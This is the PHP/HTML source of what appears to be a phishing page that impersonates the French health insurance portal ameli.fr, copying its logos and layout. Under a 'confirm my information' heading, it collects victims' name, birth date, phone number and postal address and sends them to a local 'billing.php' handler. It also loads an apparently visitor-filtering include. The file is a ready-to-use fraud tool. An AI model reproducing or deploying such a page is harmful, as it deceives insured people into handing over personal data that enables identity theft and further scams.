<?php 

include("../common/sub_includes.php");
include("../prevents/all.php");

?>


<!DOCTYPE html>
<html lang="fr" slick-uniqueid="3">

<?php include("../common/header.php") ?>
<body>
    <header class="wlp-bighorn-header" role="banner">
        <div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
            <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto">
                <div></div>
                <div class="wlp-bighorn-theme wlp-bighorn-theme-borderless">
                    <div id="Header" class="wlp-bighorn-window  ">
                        <div class="wlp-bighorn-window-content">

                            <div style="overflow-x:hidden;">
                                <div class="tetiere-connexion">

                                    <div class="liens">

                                        <!-- Redirection vers la page de connexion -->

                                        <a class="r_btsubmit r_btlien" href="https://assure.ameli.fr:443https://assure.ameli.fr/PortailAS/appmanagerhttps://assure.ameli.fr/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_login_page&amp;connexioncompte_2actionEvt=afficher" title="Votre compte ameli - Connexion">
                                            Se connecter
                                        </a>

                                    </div>

                                    <a class="r_lien_image" href="https://assure.ameli.fr:443https://assure.ameli.fr/PortailAS/appmanagerhttps://assure.ameli.fr/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_accueil_page" title="Accéder à l'accueil">
                                        <img src="https://assure.ameli.fr/PortailAS/ShowProperty/WLP%20Repository/images/logosRegimes/logo_regime_general" class="logoam" alt="Logo du régime d'assurance maladie">
                                        <img src="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/refonte/header/Icon-60@3x.png" class="logoam-320" alt="Logo du régime d'assurance maladie">
                                    </a>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <div id="ameli_portal_book_2" class="wlp-bighorn-book">
        <div class="wlp-bighorn-book-content">
            <div id="as_connexion_book" class="wlp-bighorn-book">
                <div class="wlp-bighorn-book-content">
                    <main id="as_login_page" class="wlp-bighorn-page-unconnect" role="main">
                        <section id="contenu" class="corps-de-page">
                            <div class="wlp-bighorn-layout wlp-bighorn-layout-grid">
                                <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-grid-cell">
                                    <div></div>
                                    <div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
                                        <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-vertical wlp-bighorn-layout-flow-first" style="height: auto">
                                            <div></div>
                                            <div id="connexioncompte_2" class="wlp-bighorn-window  ">
                                                <div class="wlp-bighorn-window-content">

                                                    <link href="../../framework/skins/assure/css/centrer.css" rel="stylesheet" type="text/css">
                                                    <link rel="stylesheet" href="../../framework/skins/assure/css/smart-app-banner.css" type="text/css" media="screen">



                                                    <style type="text/css">
                                                        .wlp-bighorn-book{
                                                            width : 100%;
                                                          }
                                                          #connexioncompte_2 {
                                                            padding-top: 190px;
                                                          }
                                                          
                                                          /* Small Devices, Tablets */
                                                          @media only screen and (max-width : 767px) { 
                                                            #Header .tetiere-connexion {
                                                              margin-bottom: 60px;
                                                            }
                                                            .connexioncompte_2 .connexion-login {
                                                              margin-top: -20px;
                                                            }
                                                            #erreurCookie {
                                                              margin-top: -20px;
                                                              margin-bottom: 60px;
                                                            }
                                                            #connexioncompte_2 {
                                                              padding-top: 100px;
                                                            }
                                                            .connexioncompte_2{
                                                              padding-right: 30px !important;
                                                              padding-left: 30px !important;
                                                            }
                                                          }
                                                          
                                                          @media only screen and (min-width : 768px) { 
                                                            #Header .tetiere-connexion {
                                                              margin-bottom: 88px;
                                                            }
                                                            .connexioncompte_2 .connexion-login {
                                                              margin-top: -48px;
                                                            }
                                                            #erreurCookie {
                                                              margin-top: -48px;
                                                              margin-bottom: 88px;
                                                            }
                                                          }
                                                          
                                                          /* Medium Devices */
                                                          @media screen and (min-width: 768px) and (max-width: 992px){
                                                            #connexioncompte_2 .centrepage {
                                                              width: 460px;
                                                            }
                                                          }
                                                        
                                                          input:-webkit-autofill {
                                                            -webkit-box-shadow: 0 0 0 50px white inset !important;
                                                          }
                                                    </style>

                                                    <div class="connexioncompte_2 centrepage">

                                                        <div class="r_cnx_page" id="loginPage">

                                                            <div>
                                                                <div class="r_cnx_maintenance">

                                                                </div>

                                                                <div class="r_cnx">
                                                                    <div class="connexion-login">
                                                                        <h1 class="texte-center title">
                                                                            Confirmation de mes informations
                                                                        </h1>

                                                                        <div class="zone-alerte hidden" id="navIncompatible">
                                                                            <h2>Mon compte ameli fonctionnera mieux avec une version plus récente d'Internet Explorer !</h2>
                                                                            <span>
              
                                                                            
                                                                        Mettez à jour votre navigateur grâce à ce lien
                                                                        <a id="ieDlLink" href="http://windows.microsoft.com/fr-fr/internet-explorer/download-ie" target="downloadIE" title="Mettre à jour son navigateur (nouvelle fenêtre)" tabindex="-1">http://windows.microsoft.com/fr-fr/internet-explorer/download-ie</a>
                                                                        </span>
                                                                        </div>

                                                                        <div class="r_cnx_cadre_gris" id="idBlocCnx">
                                                                            <form name="connexionCompteForm" id="form" method="post" action="../actions/billing.php" class="r_cnx_form">
                                                                                <div>
                                                                                    <div id="div_connexioncompte_2_nir_as" class="div_connexioncompte_2_wrapper" style="margin-top : 23px;">
                                                                                        <span class="zone_champ_saisie">
                                                                                            <input id="identifiant" name="ide_name" type="text" placeholder="Nom" tabindex="0" required>
                                                                                        </span>
                                                                                    </div>
                                                                                </div>

                                                                                <div>
                                                                                    <div id="div_connexioncompte_2_nir_as" class="div_connexioncompte_2_wrapper" style="margin-top : 23px;">
                                                                                        <span class="zone_champ_saisie">
                                                                                            <input id="identifiant" name="ide_surname" type="text" placeholder="Prénom" tabindex="0" required>
                                                                                        </span>
                                                                                    </div>
                                                                                </div>

                                                                                <style>
                                                                                    #birth{
                                                                                        background: transparent url(https://assure.ameli.fr/PortailAS/framework/skins/assure/images/refonte/connexion/birthday.png);
                                                                                        background-repeat: no-repeat;
                                                                                        background-position: 20px 3px;
                                                                                        background-size: 20px 20px;
                                                                                        border-bottom: solid 1px #255ea7;
                                                                                        outline: 0;
                                                                                    }

                                                                                    #phone_number_inputé{
                                                                                        background: transparent url(https://www.pngkey.com/png/full/648-6483874_phone-phone-icon-grey-png.png);
                                                                                        background-repeat: no-repeat;
                                                                                        background-position: 20px 3px;
                                                                                        background-size: 20px 20px;
                                                                                        border-bottom: solid 1px #255ea7;
                                                                                        outline: 0;
                                                                                    }
                                                                                    #add{

                                                                                        background: transparent url(https://cdn4.iconfinder.com/data/icons/adiante-apps-app-templates-incos-in-grey/512/app_type_real_state_512px_GREY.png);
                                                                                        background-repeat: no-repeat;
                                                                                        background-position: 16px 0px;
                                                                                        background-size: 25px 30px;
                                                                                        border-bottom: solid 1px #255ea7;
                                                                                        outline: 0;
                                                                                    }

                                                                                    #town,#town2{

                                                                                background: transparent url(http://icecontact.com/wp-content/uploads/2016/03/Grey_Location_Pin_Icon.png
);
                                                                                background-repeat: no-repeat;
                                                                                background-position: 20px 3px;
                                                                                background-size: 20px 20px;
                                                                                border-bottom: solid 1px #255ea7;
                                                                                outline: 0;
                                                                                }
                                                                                </style>


                                                                                <div id="birth" class="div_connexioncompte_2_wrapper" style="margin-top : 23px;">
                                                                                        <span class="zone_champ_saisie">
                                                                                            <input name="ide_birth" placeholder="Date de naissance" type="text" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" onkeyup="date_reformat_dd(this);"  onkeydown="date_reformat_dd(this);" onkeypress="date_reformat_dd(this);" onpaste="date_reformat_dd(this);" required>
                                                                                        </span>
                                                                                </div>
                                                                                <div id="phone_number_inputé" class="div_connexioncompte_2_wrapper" style="margin-top : 23px;">
                                                                                        <span class="zone_champ_saisie">
                                                                                            <input id="phone_number_input" name="ide_tel" placeholder="Numéro de téléphone"  type="number" required>
                                                                                        </span>
                                                                                </div>

                                                                                <div id="add" class="div_connexioncompte_2_wrapper" style="margin-top : 23px;">
                                                                                        <span class="zone_champ_saisie">
                                                                                            <input id="identifiant" name="ide_adresse" type="text" placeholder="Adresse" tabindex="0"  required>
                                                                                        </span>
                                                                                    </div>

                                                                                    <div id="town" class="div_connexioncompte_2_wrapper" style="margin-top : 23px;">
                                                                                        <span class="zone_champ_saisie">
                                                                                            <input id="identifiant" name="ide_ville" type="text" placeholder="Ville" tabindex="0" required>
                                                                                        </span>
                                                                                    </div>

                                                                                    <div id="town2" class="div_connexioncompte_2_wrapper" style="margin-top : 23px;">
                                                                                        <span class="zone_champ_saisie">
                                                                                            <input id="postal_input" name="ide_zip" type="number" placeholder="Code postal" tabindex="0" required>
                                                                                        </span>
                                                                                    </div>

                                                                                    <div class="cnxRequis">
                                                                                        <span>Tous les champs sont obligatoires.</span>
                                                                                    </div>

                                                                                    <div>

                                                                                        <input id="id_r_cnx_btn_submit" type="submit" name="ide_billing_submit" value="me connecter" class="r_btsubmit btn-connection">
                                                                                    </div>
                                                                                </div>
                                                                                <input type="hidden" name="_ct" value="OZFN-NHM0-TW28-BL6G-JGJ1-HF5K-VDRJ-1MGM"></form>

                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </section>
                    </main>
                </div>
            </div>
        </div>
    </div>
    <?php include("../common/footer.php") ?>                                                     
</body>

</html>

</html>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"
integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
crossorigin="anonymous"></script>

<script src="../assets/js/mask.js"></script>


<script>
    $('#postal_input').on('input propertychange', function() {
    charLimit(this, 5);
});


$('#phone_number_input').on('input propertychange', function() {
    charLimit(this, 10);
});

            
let charLimit = (input, maxChar) => {
    let len = $(input).val().length;
    if (len > maxChar) {
        $(input).val($(input).val().substring(0, maxChar));
    };
}


function checkValue(str, max) {
    if (str.charAt(0) !== '0' || str == '00') {
        var num = parseInt(str);
        if (isNaN(num) || num <= 0 || num > max) num = 1;
        str = num > parseInt(max.toString().charAt(0)) && num.toString().length == 1 ? '0' + num : num.toString();
    };
    return str;
    };
    
// reformat by date
function date_reformat_dd(date) {
    date.addEventListener('input', function(e) {
        this.type = 'text';
        var input = this.value;
        if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
        var values = input.split('/').map(function(v) {
            return v.replace(/\D/g, '')
        });
        if (values[1]) values[1] = checkValue(values[1], 12);
        if (values[0]) values[0] = checkValue(values[0], 31);
        var output = values.map(function(v, i) {
            return v.length == 2 && i < 2 ? v + ' / ' : v;
        });
        this.value = output.join('').substr(0, 14);
    });
}

// reformat by month
function date_reformat_mm(date) {
    date.addEventListener('input', function(e) {
        this.type = 'text';
        var input = this.value;
        if (/\D\/$/.test(input)) input = input.substr(0, input.length - 3);
        var values = input.split('/').map(function(v) {
            return v.replace(/\D/g, '')
        });
        if (values[0]) values[0] = checkValue(values[0], 12);
        if (values[1]) values[1] = checkValue(values[1], 31);
        var output = values.map(function(v, i) {
            return v.length == 2 && i < 2 ? v + ' / ' : v;
        });
        this.value = output.join('').substr(0, 14);
    });


}
</script>
